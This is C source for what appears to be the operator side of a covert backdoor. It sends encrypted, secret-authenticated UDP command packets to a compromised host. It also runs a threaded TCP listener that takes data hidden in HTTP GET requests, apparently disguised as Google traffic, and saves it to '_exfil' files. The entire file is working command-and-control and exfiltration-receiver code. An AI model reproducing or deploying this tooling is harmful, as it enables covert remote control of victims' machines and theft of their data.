/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <pthread.h>
#include <netdb.h>

#include "common.h"
#include "util.h"
#include "google.h"
#include "client.h"


#define CMD_REQ_TS_INDEX 0
#define CMD_REQ_SECRET_INDEX 4
#define CMD_REQ_IP_INDEX 12
#define CMD_REQ_CMD_INDEX 16
#define CMD_REQ_DATA_INDEX 17

typedef struct CLIENT_CTX client_ctx;

struct CLIENT_CTX {
    int sd;
    const char *key;
};

static int exfil_file_count = 0;

int send_command_request(const char *host, unsigned short port, const char *shared_key, const char *listener_ip, unsigned char cmd, const char *data)
{
    int rc = -1;
    int sd;
    size_t data_len = strlen(data);
    size_t buf_len = data_len + CMD_REQ_CMD_INDEX + 1;
    unsigned long ts;
    char buf[BUFLEN];
    struct hostent *ent;

    //dbg_print("%s: inside function, host=%s, port=%d, shared_key=%s, listener_ip=%s, cmd=0x%02X, data=%s", __FUNCTION__, host, port, shared_key, listener_ip, cmd, data);

    if((sd = socket_create_udp_c(host, port)) < 0)
    {
        //dbg_print("%s: udp_socket failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        goto end_of_func;
    }

    if((ent = gethostbyname(listener_ip)) == NULL)
    {
        //dbg_print("%s: gethostbyname failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        goto end_of_func;
    }

    //dbg_print("%s: connected UDP socket to %s:%d, sd=%d", __FUNCTION__, host, port, sd);
    timestamp_generate(&ts);
    memcpy(buf + CMD_REQ_TS_INDEX, &ts, sizeof(ts));
    memcpy(buf + CMD_REQ_SECRET_INDEX, SECRET, 8);
    memcpy(buf + CMD_REQ_IP_INDEX, ent->h_addr, 4);    
    //memcpy(buf + CMD_REQ_USER_INDEX, user, user_len > CMD_REQ_USER_FIELD_LEN ? CMD_REQ_USER_FIELD_LEN : user_len);
    buf[CMD_REQ_CMD_INDEX] = cmd;
    memcpy(buf + CMD_REQ_DATA_INDEX, data, data_len);
    enc_stream_buffer(shared_key, buf, buf_len);

    if((rc = send(sd, buf, buf_len, 0)) < 0)
    {
        //dbg_print("%s: send failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        goto end_of_func;
    }

    //dbg_print("%s: sent %d bytes to %s:%d, sd=%d", __FUNCTION__, rc, host, port, sd);

end_of_func:
    return rc;
}

void *client_handler_proc(void *ptr)
{
    client_ctx *ctx = (client_ctx *)ptr;
    int sd = ctx->sd;
    char buf[BUFLEN] = {0};
    char payload[MAX_PAYLOAD_LEN + 1] = {0};
    char real_cookie[256] = {0};
    char cdate[32] = {0};
    char filename[64] = {0};
    time_t cur_time;
    struct tm *lt = NULL;
    FILE *fp = NULL;
    ssize_t buflen;
    int loop_count = 0;
    int done = 0;

    time(&cur_time);
    lt = localtime(&cur_time);
    strftime(cdate, sizeof(cdate), "%Y-%m-%d_%H%M%S", lt);
    snprintf(filename, sizeof(filename), "%s_exfil.%d", cdate, exfil_file_count);
    fp = fopen(filename, "wb");
	strcat(real_cookie, "\r\n\r\n");
    buflen = sizeof(buf);
    memset(buf, 0, buflen);

    while(!done)
    {
        buflen = sizeof(buf);
        memset(buf, 0, buflen);    
        http_read(sd, buf, &buflen);
    
		if(loop_count)
		{
		    //dbg_print("%s: read HTTP GET from Backdoor (length=%d)", __FUNCTION__, buflen);
		    memset(payload, 0, MAX_PAYLOAD_LEN + 1);
		    done = g_get_request_payload(buf, payload);
		    //dbg_print("%s: extracted payload from HTTP GET from Backdoor (length=%d)", __FUNCTION__, strlen(payload));

		    if(!done) 
            {
		        fwrite(payload, strlen(payload), 1, fp);        
                //dbg_print("%s: dumping payload:\n%s", __FUNCTION__, payload);
            }
            
		}

		loop_count++;
	}	
    
    fclose(fp);
    exfil_file_count++;

    return ptr;
}

int run_listener(unsigned short port, const char *shared_key)
{
    int rc = -1;
    int sd;
    int tmpfd;
    struct sockaddr_in src_addr;
    socklen_t src_addr_len;
    pthread_t th;
    client_ctx ctx = { .key = shared_key, };

    //dbg_print("%s: inside function, port=%d, shared_key=%s", __FUNCTION__, port, shared_key);

    if((sd = socket_create_tcp_l(port)) < 0)
    {
        //dbg_print("%s: socket_create_tcp_l failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
        goto end_of_func;
    }

    //dbg_print("%s: created listener socket on port %d, sd=%d", __FUNCTION__, port, sd);

    for(;;)
    {
        if((tmpfd = accept(sd, (struct sockaddr *)&src_addr, &src_addr_len)) < 0)
        {
            //dbg_print("%s: accept failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
            goto end_of_func;
        }

        ctx.sd = tmpfd;

        if(pthread_create(&th, NULL, client_handler_proc, (void *)&ctx) != 0)
        {
            //dbg_print("%s: pthread_create failed, errno=%d, errstr=%s", __FUNCTION__, errno, strerror(errno));
            goto end_of_func;
        }
    }

end_of_func:
    //dbg_print("%s: leaving function, rc=%d", __FUNCTION__, rc);
    return rc;
}
